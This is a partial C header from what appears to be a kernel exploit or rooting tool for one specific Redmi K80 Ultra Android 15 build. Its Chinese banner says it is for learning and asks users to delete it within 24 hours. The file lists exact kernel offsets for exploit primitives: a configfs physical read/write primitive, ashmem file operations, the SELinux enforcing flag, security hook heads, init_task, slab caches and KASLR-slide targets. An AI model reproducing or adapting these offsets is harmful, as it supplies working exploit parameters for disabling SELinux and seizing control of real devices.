...
/*
 * Target: dali-AP3A.240905.015.A2
 * Device: Redmi/dali/dali (Redmi K80 Ultra)
 * Build:  AP3A.240905.015.A2 / OS2.0.220.0.VONCNXM
 * Kernel: Linux 6.6.56-android15-8-gca30f3b4bef6 (GKI 6.6 / Android 15)
 * Arch:   AArch64
 *
 * All offsets derived from 220.elf via IDA Pro MCP (2026-07-11).
...
#define BUILD_VARIANT_LABEL "dali_AP3A.240905.015.A2"
#define BUILD_FINGERPRINT   "Redmi/dali/dali:16/AP3A.240905.015.A2/220:user/release-keys"
#define STARTUP_BANNER      "酷安@本地主机制作，请勿倒卖，仅供学习使用，请在24小时后删除"
...
#define ASHMEM_MISC_FOPS_OFF         0x0221a328ULL  /* &ashmem_misc+0x10    */
#define ASHMEM_FOPS_OFF              0x012bb2b0ULL  /* ashmem_fops struct   */
#define ASHMEM_IOCTL_OFF             0x00c6d578ULL
#define ASHMEM_COMPAT_IOCTL_OFF      0x00c6dc34ULL  /* compat_ashmem_ioctl  */
#define ASHMEM_MMAP_OFF              0x00c6dc88ULL
#define ASHMEM_OPEN_OFF              0x00c6dea8ULL
#define ASHMEM_RELEASE_OFF           0x00c6df30ULL
#define ASHMEM_SHOW_FDINFO_OFF       0x00c6dfbcULL

/* configfs binary attribute R/W — physrw primitive entry points              */
#define CONFIGFS_READ_ITER_OFF       0x00482a54ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x00482f80ULL

/* generic VFS helpers                                                        */
#define COPY_SPLICE_READ_OFF         0x004079a4ULL
#define NOOP_LLSEEK_OFF              0x003bab44ULL

/* scheduler / task state                                                     */
#define INIT_TASK_OFF                0x020bdb80ULL
#define ROOT_TASK_GROUP_OFF          0x022b1580ULL

/* SELinux                                                                    */
/* selinux_state is the struct; byte 0 is the enforcing flag (see             */
/* sel_read_enforce: LDRB W3,[X8,#selinux_state@PAGEOFF])                    */
#define SELINUX_BLOB_SIZES_OFF       0x0163cac8ULL
#define SELINUX_ENFORCING_OFF        0x022f2d58ULL  /* = selinux_state addr  */
#define SECURITY_HOOK_HEADS_OFF      0x0163c390ULL

/* slab allocator                                                             */
#define KMALLOC_CACHES_OFF           0x0163bed0ULL

/* pipe                                                                       */
#define ANON_PIPE_BUF_OPS_OFF        0x0113c208ULL
 ...
 */
#define SLIDE_NFULNL_LOGGER_OFF          0x020b2258ULL  /* nfulnl_logger     */
#define SLIDE_LOGGERS_0_1_OFF            0x020b21a0ULL  /* loggers[0] slot   */
/* random_table + 0x108: boot_id ctl_table.data, confirmed in IDA. */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x021d7d40ULL  /* random_table boot_id .data */
#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e3e1b0ULL  /* nfulnl_log_packet */
...
#define SLIDE_SYSCTL_BOOTID_OFF          0x02313d48ULL  /* sysctl_bootid UUID */
